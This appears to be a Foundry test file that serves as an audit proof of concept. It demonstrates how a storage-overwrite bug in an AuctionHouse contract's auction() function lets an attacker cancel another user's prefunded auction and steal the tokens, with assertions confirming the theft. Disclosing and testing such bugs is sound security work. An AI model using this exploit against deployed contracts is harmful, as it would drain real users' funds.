// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Test.sol";

// Core protocol contracts
import {AuctionHouse} from "src/AuctionHouse.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol";

// Mock module used for tests (simple atomic auction implementation)
import {MockAtomicAuctionModule} from "test/modules/Auction/MockAtomicAuctionModule.sol";
import {ICallback} from "src/interfaces/ICallback.sol";

// Utilities
import {MockERC20} from "lib/solmate/src/test/utils/mocks/MockERC20.sol";

// Types
import {Keycode, toKeycode} from "src/modules/Modules.sol";
import {Auction} from "src/modules/Auction.sol";

/// @title ExploitTest
/// @notice Proof-of-Concept demonstrating how an attacker can steal prefunded
///         tokens due to the lotRouting[0] overwrite bug in Auctioneer.auction().
///
/// Scenario
/// 1. Honest user (Alice) creates a *prefunded* auction supplying BASE tokens.
///    Due to the bug, all routing information is stored at lotRouting[0].
/// 2. Attacker (Bob) immediately creates a second (un-prefunded) auction.
///    The same storage slot (lotRouting[0]) is reused, so Bob becomes the
///    recorded seller while the previous `funding` value (Alice's tokens)
///    remains untouched.
/// 3. Bob calls `cancel(0)` – he is now recognised as the seller and therefore
///    authorised to cancel the auction. The `funding` is transferred to Bob,
///    allowing him to steal Alice's tokens.
contract ExploitTest is Test {
    // Actors
    address internal alice = vm.addr(1); // honest seller
    address internal bob   = vm.addr(2); // attacker
    address internal deployer = vm.addr(3); // contract owner

    // Contracts
    AuctionHouse internal house;
    MockAtomicAuctionModule internal module;
    MockERC20 internal base;
    MockERC20 internal quote;

    // Constants
    uint256 internal constant CAPACITY = 1_000 ether; // amount Alice prefunds

    function setUp() public {
        // Label addresses for nicer traces
        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(deployer, "Deployer");

        // Deploy tokens
        base  = new MockERC20("BASE", "BASE", 18);
        quote = new MockERC20("QUOTE", "QUOTE", 18);

        // Mint tokens
        base.mint(alice, CAPACITY);
        quote.mint(bob, 10 ether); // arbitrary – not used

        // Deploy AuctionHouse (owner = deployer, protocol/permit2 unused)
        vm.prank(deployer);
        house = new AuctionHouse(deployer, address(0), address(0));

        // Deploy and install mock auction module
        module = new MockAtomicAuctionModule(address(house));
        vm.prank(deployer);
        house.installModule(module);
    }

    function testExploitStealsPrefund() public {
        /////////////////////////////////////////////////
        // 1. Alice creates a *prefunded* auction (lot 0)
        /////////////////////////////////////////////////
        vm.startPrank(alice);
        base.approve(address(house), CAPACITY);

        // Construct routing parameters
        Auctioneer.RoutingParams memory routing = Auctioneer.RoutingParams({
            auctionType:  toKeycode("ATOM"),
            baseToken:     base,
            quoteToken:    quote,
            curator:       address(0),
            callbacks:     ICallback(address(0)),
            callbackData:  bytes("") ,
            derivativeType: Keycode.wrap(bytes5(0)),
            derivativeParams: bytes("") ,
            wrapDerivative: false,
            prefunded:     true
        });

        // Construct generic auction parameters (values do not matter for exploit)
        Auction.AuctionParams memory params = Auction.AuctionParams({
            start: 0,
            duration: 1 days,
            capacityInQuote: false,
            capacity: uint96(CAPACITY),
            implParams: bytes("")
        });

        uint96 lotId0 = house.auction(routing, params, "info");
        assertEq(lotId0, 0, "First lot should have id 0");
        vm.stopPrank();

        // Sanity – prefund held by contract
        assertEq(base.balanceOf(address(house)), CAPACITY, "House should hold prefund");

        ///////////////////////////////////////////////////
        // 2. Bob creates a *non-prefunded* auction (lot 1)
        ///////////////////////////////////////////////////
        vm.startPrank(bob);
        // No approval needed because non-prefunded
        routing.prefunded = false; // override flag
        uint96 lotId1 = house.auction(routing, params, "info2");
        assertEq(lotId1, 1, "Second lot should have id 1");
        vm.stopPrank();

        ///////////////////////////////////////////////////
        // 3. Bob cancels lot 0 and steals Alice's tokens
        ///////////////////////////////////////////////////
        vm.startPrank(bob);
        uint256 bobBalanceBefore = base.balanceOf(bob);
        house.cancel(0, ""); // empty callback data
        vm.stopPrank();

        // ================= Assertions ================= //
        // Bob received Alice's prefunded tokens
        assertEq(base.balanceOf(bob), bobBalanceBefore + CAPACITY, "Bob stole the prefund");
        // AuctionHouse no longer holds the prefund
        assertEq(base.balanceOf(address(house)), 0, "House balance drained");
        // Alice lost her tokens
        assertEq(base.balanceOf(alice), 0, "Alice lost prefund");
    }
}
